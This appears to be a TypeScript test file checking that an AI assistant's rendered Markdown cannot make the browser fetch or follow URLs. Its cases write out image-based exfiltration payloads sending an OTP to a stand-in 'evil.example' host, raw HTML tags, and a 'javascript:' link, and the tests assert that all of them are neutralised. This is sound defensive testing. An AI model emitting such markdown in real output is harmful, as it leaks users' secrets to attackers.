/**
 * Dobbie's Markdown cannot make the browser fetch or follow anything on its
 * own. Rendered through the real react-markdown + remark-gfm pipeline the
 * assistant page uses.
 *
 *   pnpm --filter web test   (from the repo root)
 */
import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { markdownComponents } from "./markdown-components";

const render = (md: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: markdownComponents }, md));

const EXFIL = "https://evil.example/collect?d=OTP-123456";

test("no image is ever rendered — inline, reference-style, linked or in a table", () => {
  const cases = [
    `Here is your summary ![status](${EXFIL})`,
    `![](${EXFIL})`,
    `See ![chart][r]\n\n[r]: ${EXFIL}`,
    `[![badge](${EXFIL})](${EXFIL})`,
    `| a |\n|---|\n| ![x](${EXFIL}) |`,
  ];
  for (const md of cases) {
    const html = render(md);
    assert.doesNotMatch(html, /<img/i, `rendered an <img> for ${JSON.stringify(md)}`);
    assert.doesNotMatch(html, /evil\.example/, `the URL reached the DOM for ${JSON.stringify(md)}`);
  }
});

test("an image's alt text survives as plain text, so the answer reads the same", () => {
  assert.match(render(`Your report is ready ![quarterly chart](${EXFIL}).`), /Your report is ready quarterly chart\./);
});

test("raw HTML in model output is never rendered as elements", () => {
  const html = render(`<img src="${EXFIL}"> and <a href="${EXFIL}">x</a>`);
  assert.doesNotMatch(html, /<img|<a /i);
});

test("links: only relative /inbox/ paths are live; everything else is plain text", () => {
  assert.match(render("[open thread](/inbox/abc123)"), /<a href="\/inbox\/abc123">open thread<\/a>/);
  for (const md of [`[click](${EXFIL})`, `<${EXFIL}>`, `${EXFIL}`, "[x](javascript:alert(1))", "[x](//evil.example/inbox/a)"]) {
    const html = render(md);
    assert.doesNotMatch(html, /<a /i, `live link for ${JSON.stringify(md)}`);
  }
});

test("ordinary formatting is untouched", () => {
  const html = render("**Bold** and *italic*\n\n- one\n- two");
  assert.match(html, /<strong>Bold<\/strong>/);
  assert.match(html, /<li>one<\/li>/);
});
